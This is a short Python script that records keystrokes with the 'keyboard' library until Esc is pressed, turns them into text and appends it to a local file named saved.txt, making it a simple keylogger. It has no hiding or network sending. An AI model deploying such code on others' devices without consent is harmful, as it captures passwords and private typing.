class keyPython:
    def __init__(self):
        self.keyboard = __import__('keyboard')
        self.listen = []
    def listening(self):
        self.listen = self.keyboard.record(until='esc')
        return self.listen
    def translate(self,listen):
        data = []
        for i in listen:
            stroke = str(i)
            beg = stroke.index('(')
            end = stroke.index(' ')
            end2 = stroke.index(')')
            if stroke[end:end2].strip() == 'down':
                if stroke[beg+1:end].strip() in ['ctrl','alt','up','down','left','right']:
                    continue
                if stroke[beg+1:end].strip() in ['enter', 'tab']:
                    data.append('\n')
                    continue
                if stroke[beg+1:end].strip() in ['space','esc']:
                    data.append(' ')
                    continue
                if stroke[beg+1:end].strip() == 'backspace':
                    data.pop()
                    continue
                data.append(stroke[beg+1:end].strip())
            else:
                continue
            translated = ''
            for i in data:
                translated += i
        return translated
    def export(self,translated):
        with open('saved.txt','a+') as file:
            file.write(translated)
            file.write('\n')
    def main(self):
        cons_listen = self.listening()
        translate = self.translate(cons_listen)
        self.export(translate)
    
if __name__ == '__main__':
    app = keyPython()
    app.main()